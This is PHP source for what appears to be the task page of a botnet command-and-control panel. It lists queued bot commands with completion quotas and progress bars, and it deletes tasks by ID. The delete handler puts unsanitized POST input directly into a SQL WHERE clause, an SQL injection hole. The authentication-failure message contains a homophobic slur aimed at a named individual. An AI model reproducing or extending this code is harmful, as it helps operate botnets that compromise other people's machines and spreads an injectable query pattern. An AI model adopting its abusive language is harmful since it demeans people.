<?php
	try {
		$Auth = new Auth();
		$Auth->RequireSession();
		$Auth->Ajax();
		$Auth->Validate(false);
	} catch(Exception $e) {
		die("fuck u faggot azuisleet");
	}
	if(isset($_POST['ID'])) {
		// DELETE THIS MOTHERFUCKER AHAHAHA
		$pID = $_POST['ID'];
		$Override = array("WHERE" => "CommandID = " . $pID);
		$lBots = BotCommand::Find($Override);
		if(count($lBots) == 0)
			die("Invalid ID or missing record.");
		$lBots[0]->Delete();
		die("OK");
	}
	if(!isset($_GET['PageOffset'])) {
		$Override = array("LIMIT" => "0, 10");
	} else {
		$Override = array("LIMIT" => intval($_GET['PageOffset']) . ", 10");
	}
	$lBots = BotCommand::Find($Override);
	if(count($lBots) == 0 && isset($_GET['PageOffset'])) {
		echo "NO";
		exit();
	}
	$BotsInfo = array();
	foreach($lBots as $lBot) {
		$mInfo = array();
		$mInfo['ID'] = $lBot->Get('CommandID');
		$lCmd = explode(" ", $lBot->Get('CommandString'));
		$mInfo['Command'] = str_replace("base.", "", $lCmd[0]);
		$mInfo['Completion'] = $lBot->Get('CommandCount') . "/" . $lBot->Get('CommandQuota');
		$mInfo['Percentage'] = round((intval($lBot->Get('CommandCount')) / intval($lBot->Get('CommandQuota'))) * 100);
		$BotsInfo[] = $mInfo;
	}
	/*print_r($BotsInfo);
	echo "<!-- \$lBots -->";
	print_r($lBots);*/
	if(isset($_GET['PageOffset'])) {
		?>
		<tr>
			<th>ID</th>
			<th>Command</th>
			<th>Completion</th>
			<th>Progress</th>
			<th>%</th>
			<th>Remove</th>
		</tr>
		<?php
		foreach($BotsInfo as $BotInfo) {
				$HTML = "
				<tr class=\"Tasks_TaskEntry\">
				<td>{$BotInfo['ID']}</td>
				<td>{$BotInfo['Command']}</td>
				<td>{$BotInfo['Completion']}</td>
				<td>
				<div class=\"precipitationBGGray\" style=\"width:104px;\">
					<div id=\"Task_InnerSlider\" class=\"curPrecipitation\" style=\"width:{$BotInfo['Percentage']}px;\">
					</div>
				</div>
				</td>
				<td>{$BotInfo['Percentage']}%</td>
				<td><a href=\"javascript:void(0)\" onclick=\"TasksRemove({$BotInfo['ID']})\">X</a></td>
				</tr>
";			
			echo $HTML;
		}
		exit();
	}
	
?>
	<div id="Tasks_Wrapper" style="text-align:center;display:block;">
	<table id="Tasks_Table">
		<tr>
			<th>ID</th>
			<th>Command</th>
			<th>Completion</th>
			<th>Progress</th>
			<th>%</th>
			<th>Remove</th>
		</tr>
		<?php
			
			foreach($BotsInfo as $BotInfo) {
				$HTML = "
				<tr class=\"Tasks_TaskEntry\">
				<td>{$BotInfo['ID']}</td>
				<td>{$BotInfo['Command']}</td>
				<td>{$BotInfo['Completion']}</td>
				<td>
				<div class=\"precipitationBGGray\" style=\"width:104px;\">
					<div id=\"Task_InnerSlider\" class=\"curPrecipitation\" style=\"width:{$BotInfo['Percentage']}px;\">
					</div>
				</div>
				</td>
				<td>{$BotInfo['Percentage']}%</td>
				<td><a href=\"javascript:void(0)\" onclick=\"TasksRemove({$BotInfo['ID']})\">X</a></td>
				</tr>
";
				echo $HTML;
			}
		?>
	</table>
	</div><br />
	<span style="position:absolute;left:4px;bottom:1px;" onclick="TasksPrevious()">Previous</span>
	<span style="position:absolute;right:4px;bottom:1px;" onclick="TasksNext()">Next</span>
	<span style="position:absolute;right:46%;left:46%;bottom:1px;"><?php echo BotCommand::GetRowCount(); ?>-Tasks</span>